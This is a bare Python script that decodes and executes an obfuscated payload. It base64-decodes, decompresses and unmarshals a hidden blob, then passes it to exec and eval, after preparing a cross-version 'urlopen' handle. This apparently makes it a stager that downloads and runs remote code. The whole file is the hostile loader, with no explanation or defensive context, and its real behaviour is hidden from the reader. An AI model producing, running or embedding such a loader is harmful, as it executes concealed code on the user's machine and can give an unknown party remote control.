import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwFwUkOgCAMAEB+A1xaaoxBrr6EaKMmBFnKgd87Mw6l1GjpK5yNfkRKQKR9Ado8OCC3Bu88IZ7p5Swdu8SbW8daJ5SpLTSOl7E/7VQVfg==')))))